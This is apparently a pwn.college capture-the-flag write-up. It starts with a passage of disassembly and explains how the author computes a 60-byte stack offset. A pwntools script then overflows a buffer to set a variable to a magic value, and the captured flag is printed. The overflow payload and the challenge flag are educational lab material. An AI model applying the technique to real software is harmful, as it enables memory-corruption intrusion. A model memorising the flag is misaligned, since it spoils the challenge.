  401ce4:       c3                      ret
  401ce5:       66 66 2e 0f 1f 84 00    data16 cs nop WORD PTR [rax+rax*1+0x0]
  401cec:       00 00 00 00

0000000000401cf0 <__libc_csu_fini>:
  401cf0:       f3 0f 1e fa             endbr64
  401cf4:       c3                      ret

Disassembly of section .fini:

0000000000401cf8 <_fini>:
  401cf8:       f3 0f 1e fa             endbr64
  401cfc:       48 83 ec 08             sub    rsp,0x8
  401d00:       48 83 c4 08             add    rsp,0x8
  401d04:       c3                      ret

```


- i see a lot of padding.
- main calls challenge




Looking at the assembly code : 
```
401b8d:       8b 45 ec                mov    -0x14(%rbp),%eax
401b90:       3d 8a cb 0f 20          cmp    $0x200fcb8a,%eax
401b95:       75 0a                   jne    401ba1 <challenge+0x110>
```
we can see that win is being compared with `0x200fcb8a` and then jne is being run. so we need to change win to this value.

### Calculating offset : 

you can brute force the offset from 1 to 1000 or we can look at the assembly code a little bit, we know where we are assigning memory  :



- in the win var comparison we can find where the win addr is  :
  
- `401b90:       3d 8a cb 0f 20          cmp    $0x200fcb8a,%eax`
- now we also know where input buffer starts :
- `401b2a:       48 8d 45 b0             lea    -0x50(%rbp),%rax`
- i can just subtract to fin the offset :

- `0x50 - 0x14 = 0x3C - 60 bytes`
- thus we offset by 60 and send the constant which jumps the flow to win().


here is the script


```
In [1]: from pwn import *
   ...:
   ...: p = process('./binary-exploitation-var-control')
   ...:
   ...: 
   ...: payload = b'A' * 60 + p32(0x200fcb8a)
   ...:
   ...: p.send(payload)
   ...: print(p.recvall())
[x] Starting local process './binary-exploitation-var-control'
[+] Starting local process './binary-exploitation-var-control': pid 592
[x] Receiving all data
[x] Receiving all data: 0B
[*] Process './binary-exploitation-var-control' stopped with exit code 0 (pid 592)
[x] Receiving all data: 135B
[+] Receiving all data: Done (135B)
b'Send your payload (up to 4096 bytes)!\nYou win! Here is your flag:\npwn.college{koTVQ5lWtFJNpOfbBnCsm_hATMv.dhTNzMDLzQjN0czW}\n\n\nGoodbye!\n'
```
# the flag :

`pwn.college{koTVQ5lWtFJNpOfbBnCsm_hATMv.dhTNzMDLzQjN0czW}`


# tangents :

i found out the rip offset using the cyclic pattern. basically got the offset to rbp and rbp + 8 is generally rip but for some reason overwriting rip to win address didnt work

will need to do more research on why this is the case.

